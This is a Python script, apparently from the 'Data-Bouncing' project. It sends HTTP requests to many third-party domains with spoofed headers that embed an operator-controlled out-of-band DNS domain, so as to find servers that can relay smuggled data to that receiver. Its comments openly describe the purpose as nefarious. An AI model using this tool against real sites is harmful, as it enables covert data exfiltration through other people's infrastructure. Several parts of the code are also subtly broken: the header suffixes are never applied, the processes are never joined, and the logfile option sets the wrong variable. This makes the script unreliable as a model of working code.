#!/usr/bin/env python

# A hunter script for/from John & Dave's Data-Bouncing project:	https://thecontractor.io/data-bouncing/
# This script will find candidates for smuggling data/comms/whatever, starting as HTTP(S) requests to domains, ending up in your DNS reciever to be rebuilt/read/whatever
# dont forget to add your own OOB server (this could be interactsh or collaborator, or something else). If you dont know what you're doing, go read the posts :) 
# Have fun, dont do anything illegal... Seriously... don't. 

import subprocess
import sys
import os
import getopt
import time
import re
import requests

#from multiprocessing import Pool
from multiprocessing import Process


# Global variables
# Some can be canged on the command line, at some point they will be changed using a config file too
verbose = False
log_file = "script_log_" + time.strftime("%Y%m%d_%H%M%S") + ".log"		# Log file for each run
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"	# User agent for request header
domain_file_name = "domains.conf"
oob_domain = ""	# No default for OOB domain


# Check that required *nix utilities are present
def check_utilities():
	# The following *nix utilities are needed
	#utilities = ["curl", "parallel", "bc"]
	utilities = ["bc"]
	
	# Check that the utilities are present on the system
	for utility in utilities:
		# Get system to check that utility is present
		sys_output = subprocess.run(["which", utility, "/dev/null"], capture_output=True)
		
		# Check response to determine whether utility is present or not
		path_fragment = '/' + utility
		
		if not path_fragment in str(sys_output):
		
			# If utility is not present get user consent to install
			print("Script requires bc.")
			user_response = input(utility + " is not installed. Would you like to install it? (y/N) ").strip().lower()
	        
			if user_response.startswith('y'):
	        	
				# Check user has permissions to install
				if (sys.platform == "linux" or sys.platform == "linux2") and (not os.geteuid() == 0):
					print("Please run this script as root or use sudo to install " + utility + ".")
					exit(1)
	            
				# Determine which package manager is installed (work throuh them in descending order of greatness)
				if subprocess.run(["command", "-v", "brew"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
					subprocess.run(["brew", "install", utility])
				elif subprocess.run(["command", "-v", "apt"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
					subprocess.run(["apt", "update"])
					subprocess.run(["apt", "install", "-y", utility])
				elif subprocess.run(["command", "-v", "yum"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0:
					subprocess.run(["yum", "install", "-y", utility])
				else:
					print("Could not find a package manager to install {utility}. Please install it manually.")
					exit(1)
			else:
				print("Install the dependencies manually and then try again.")


# Print usage
def usage():
	print("recruiter")
	print()
	print("Usage: head_hunter.py -o <target_OOB_domain> [options]")
	print("-o --oob-domain <target_OOB_domain>\tOut-of-band domain name to use")
	print("-l --logfile <filename>\t\t\tWrite results to <filename>")
	print("-f --domain-file-name <filename>\tRead domains from <filename>")
	print("-v --verbose\t\t\t\tExecute in verbose mode.")
	print("-h --help\t\t\t\tShow this help.")
	print()
	sys.exit(0)
	

# Check commandline args and replace any defaults with specified args
def parse_cmdline_args():

	arg_list = sys.argv[1:]
 
	# Options
	options = "o:l:f:hv"
	# Long options
	long_options = ["oob-domain", "logfile", "domain-file-name", "help", "verbose"]
	 
	try:
	    # Parse args
		arguments, vals = getopt.getopt(arg_list, options, long_options)
	except getopt.error as err:
		# Output error, and exit
		print (str(err))
		usage()
		
	# checking each argument
	for current_arg, current_val in arguments:
		if current_arg in ("-h", "--help"):
			usage()
		elif current_arg in ("-o", "--oob-domain"):
			# Specify OOB domain
			globals()["oob_domain"] = current_val
		elif current_arg in ("-l", "--logfile"):
			# Change logfile name if required
			globals()["logfile"] =  current_val
		elif current_arg in ("-f", "--domain-file-name"):
			globals()["domain_file_name"] =  current_val
		elif current_arg in ("-v", "--verbose"):
			# Verbose output
			globals()["verbose"] = True
	
	# Check that user has provided an OOB domain
	if globals()["oob_domain"].strip() == "":
		print("Provide an OOB domain to receive traffic.")
		exit(1)
		
	# Check if domains.txt file exists
	if not os.path.isfile(globals()["domain_file_name"]):
		print("File domains.conf not found! Unable to continue...")
		exit(1)
	

# Function to process each domain in parrallel
def process_domain(domain, current_host_number, domain_count, verbose, log_file, user_agent, domain_file_name, oob_domain):

	# Strip any whitespace from domain name
	domain = domain.strip()
	    
	# Skip empty lines and whitespace (blank lines already removed but additional check for lines that are now blank after stripping spaces/tabs)
	if not domain:
		return
	    
	current_host_number += 1

	# Calculate the percentage of completion
	if domain_count > 0:
		percentage_complete = (current_host_number / domain_count) * 100
	else:
		percentage_complete = 0
	    
	# Append the special string to the truncated domain for the Host header
	    
	# Set the origin to the current domain
	origin = "https://" + domain
	# ToDo: only add this if it's actually missing - that way the user can insert http for some stuff
	    
	# This will be added to each of the headers
	suffix = domain + "." + oob_domain 

	# This header array will be used with curl for our nefarious purposes
	temp_headers = {"X-Forwarded-For": "xff.", "CF-Connecting_IP": "cfcon.", "Contact": "root@contact.",
			"X-Real-IP": "rip.", "True-Client-IP": "trip.", "X-Client-IP": "xclip.", "Forwarded": "for=ff.",
			"X-Originating-IP": "origip.", "Client-IP": "clip.", "Referer": "ref.", "From": "root@from."}
	# ToDo: At some point, maybe consider getting the above from a config file?
	# Add the domain and -H param onto the headers
	for header in temp_headers.values():
		header += suffix

	# Due to its inconvenient construction, we'll build this one separately
	wap_headers = {"X-Wap-Profile": "http://wafp." + domain + "/wap.xml"} 

	# Set User agent, host, etc. as appropriate
	headers = {"User-Agent": user_agent, "Host": "host." + suffix, "Origin": origin, "Connection": "close"}
	headers.update(temp_headers)
	headers.update(wap_headers)

	# Build the request command to include all headers and the additional data specified by the user
	response = None
	try:
		response = requests.get("http://" + domain + "/", headers=headers, timeout=10)
	except requests.exceptions.HTTPError as http_err:
		print("Error getting response from:	" + domain)
		print(http_err)
	except requests.exceptions.Timeout as tm_err:
		print("Timeout waiting for response from:	" + domain)
		print(tm_err)
	except requests.exceptions.TooManyRedirects as rd_err:
		print("Too many redirects getting response from:	" + domain)
		print(rd_err)
	except Exception as err:
		print("Error getting response from:	" + domain)
		print(err)

	# Get response from the request executed above
	if not response is None:
		output_code = response.status_code
		json_output = response.json
		resp_headers = response.headers
		resp_content = response.content

		print("Domain:	" + domain)
		print("Response:	" + str(output_code))
		if verbose == True:
			print(resp_headers)

		with open("targets.txt", "a") as target_log:
			target_log.write(domain)

	# Create a log message with the progress report
	timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
	log_message = timestamp + "::Request sent to " + domain + "::" + str(current_host_number) + " of " + str(domain_count) + "::" + str(percentage_complete) + "% complete"
		
	# Print the log message to the console
	if verbose == True:
		print(log_message)
	    
	# Log the message to the log file
	with open(log_file, "a") as log:
		log.write(log_message + "\n")


# Application entry point
if __name__ == "__main__":

	# Check required utils are present
	check_utilities()
	
	# Read cmdline args
	parse_cmdline_args()
	
	# Populate an array from the domains.txt file
	with open(globals()["domain_file_name"], "r") as domains_file:
		domains = domains_file.readlines()
    
	domains_file.close()
    
    # Remove empty lines from the array that's been populated from the file
	while ("" in domains):
		domains.remove("")
	domain_count = len(domains)
	
	# Loop through domains and process each one across available cores
	processes = []
	for domain in domains:
		# Note that multiprocessing.Process cannot access global variables so these need to be passed in
		core_proc = Process(target=process_domain, args=(domain, domains.index(domain), domain_count, globals()["verbose"], globals()["log_file"], globals()["user_agent"], globals()["domain_file_name"], globals()["oob_domain"]))
		processes.append(core_proc)
		core_proc.start()
	
	# Complete the processes
	for core_proc in processes:
		core_proc.join
		
	# Close log file after checking processes have completed
	
